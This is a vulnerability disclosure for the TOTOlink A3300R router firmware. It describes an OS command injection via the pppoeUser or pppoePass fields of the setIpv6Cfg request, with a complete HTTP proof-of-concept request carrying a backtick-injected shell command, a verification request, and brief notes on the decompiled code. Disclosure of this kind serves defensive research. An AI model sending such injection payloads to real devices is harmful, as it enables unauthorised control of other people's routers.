# TOTOlink A3300R V17.0.0cu.557_B20221024 Command Injection

## Product Information

Device: TOTOlink A3300R
Firmware Version: V17.0.0cu.557_B20221024
Manufacturer's website information：https://www.totolink.net/
Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/241/ids/36.html

![image-20240109124617070](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/7/img/image-20240109124617070.png)

## Vulnerability Description

When deal with  `setIpv6Cfg` request,`pppoeUser`or `pppoePass`parameter is vulnerable to OS command injection.

### POC

```
POST /cgi-bin/cstecgi.cgi?token=DFFE288434C4FC2A HTTP/1.1
Host: itotolink.net
Content-Length: 235
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://itotolink.net
Referer: http://itotolink.net/advance/ipv6.html?token=DFFE288434C4FC2A
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

{"dnsAutoFake":"1","lanAutoFake":"1","wanDhcp":"2","wanPriv":"0","lanRadvFake":"1","lanDhcp":"1","pppoeUser":"yy`ls>/web/cmdi7.txt`","pppoePass":"1234","pppoeServiceName":"","pppoeMtu":"1492","service":"pppoe6","topicurl":"setIpv6Cfg"}
```

injection the command "ls>/web/cmdi7.txt"

![image-20240119125319849](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/7/img/image-20240119125319849.png)

check the result.

```
GET /cmdi7.txt HTTP/1.1
Host: itotolink.net
If-Modified-Since: Mon, 24 Oct 2022 09:43:03 GMT
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://itotolink.net/wizard.html?token=C86034DE71B6FBEB
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

```

![image-20240119125609275](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/7/img/image-20240119125609275.png)

## Analysis

sub_422380 get `pppoeUser` parameter from request body

![image-20240119131956114](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/7/img/image-20240119131956114.png)

then pass to sub_41ECF8 function which handle `setIpv6Cfg` request

![image-20240119132112844](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/7/img/image-20240119132112844.png)
